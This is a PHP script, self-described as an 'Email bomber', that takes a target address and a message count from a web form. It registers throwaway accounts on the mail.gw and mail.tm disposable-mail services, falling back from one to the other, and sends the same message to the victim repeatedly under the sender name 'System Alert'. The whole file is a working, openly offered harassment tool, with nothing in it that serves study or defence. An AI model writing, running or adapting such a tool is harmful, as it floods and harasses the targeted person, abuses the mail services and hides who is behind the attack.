<?php
// bomb.php - Email bomber with Mail.gw / Mail.tm fallback
ini_set('display_errors', 1);
error_reporting(E_ALL);
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['ok' => false, 'error' => 'POST only']); exit;
}

$target  = trim($_POST['target'] ?? '');
$subject = trim($_POST['subject'] ?? '');
$message = $_POST['message'] ?? '';
$count   = (int)($_POST['count'] ?? 10);

if (!filter_var($target, FILTER_VALIDATE_EMAIL) || $subject === '' || $count < 1) {
    echo json_encode(['ok' => false, 'error' => 'bad input']); exit;
}

function req($url, $method = 'GET', $data = null, $token = null) {
    $opts = [
        'http' => [
            'method' => $method,
            'header' => "Content-Type: application/json\r\nAccept: application/json\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n",
            'timeout' => 15,
            'ignore_errors' => true
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
            'allow_self_signed' => true
        ]
    ];
    
    if ($token) $opts['http']['header'] .= "Authorization: Bearer $token\r\n";
    if ($data) $opts['http']['content'] = json_encode($data);

    $context = stream_context_create($opts);
    $res = @file_get_contents($url, false, $context);
    
    if ($res === false) {
        $err = error_get_last();
        return ['error' => 'Network fail: ' . ($err['message'] ?? 'Unknown')];
    }
    
    $decoded = json_decode($res, true);
    return $decoded ?: ['error' => 'Invalid JSON: ' . substr(strip_tags($res), 0, 50)];
}

// Try mail.gw first, then mail.tm
$apiBases = ['https://api.mail.gw', 'https://api.mail.tm'];

try {
    $sent = 0;
    $errors = [];
    $activeApi = '';
    $token = '';
    $email = '';

    // Find a working API
    foreach ($apiBases as $base) {
        $domains = req("$base/domains");
        if (isset($domains['hydra:member'][0]['domain'])) {
            $domain = $domains['hydra:member'][0]['domain'];
            $testEmail = 'bomb_' . rand(10000, 99999) . '@' . $domain;
            $pass = 'Pass' . rand(10000, 99999);
            
            $acc = req("$base/accounts", 'POST', ['address' => $testEmail, 'password' => $pass]);
            if (isset($acc['id'])) {
                $login = req("$base/token", 'POST', ['address' => $testEmail, 'password' => $pass]);
                if (isset($login['token'])) {
                    $activeApi = $base;
                    $token = $login['token'];
                    $email = $testEmail;
                    break; // Found a working API
                }
            }
        }
    }

    if (!$activeApi) {
        echo json_encode(['ok' => false, 'error' => 'All APIs blocked. Mail.gw and Mail.tm both failed to create an account.']); 
        exit;
    }

    // Send emails using the working API
    for ($i = 0; $i < $count; $i++) {
        $payload = [
            'from' => ['address' => $email, 'name' => 'System Alert'],
            'to' => [['address' => $target]],
            'subject' => $subject,
            'text' => $message
        ];
        
        $res = req("$activeApi/messages", 'POST', $payload, $token);
        
        if (isset($res['id'])) {
            $sent++;
        } else {
            $errors[] = isset($res['error']) ? $res['error'] : json_encode($res);
            // If token expired or rate limited, we might need to recreate, but we'll just log for now
        }
        
        if ($i < $count - 1) sleep(1);
    }

    if ($sent === 0) {
        echo json_encode(['ok' => false, 'error' => 'Connected to ' . $activeApi . ' but send failed: ' . implode(' | ', array_slice($errors, 0, 3))]); 
    } else {
        echo json_encode(['ok' => true, 'sent' => $sent, 'failed' => count($errors), 'via' => $activeApi]);
    }
    
} catch (Throwable $e) {
    echo json_encode(['ok' => false, 'error' => 'PHP Error: ' . $e->getMessage()]);
}
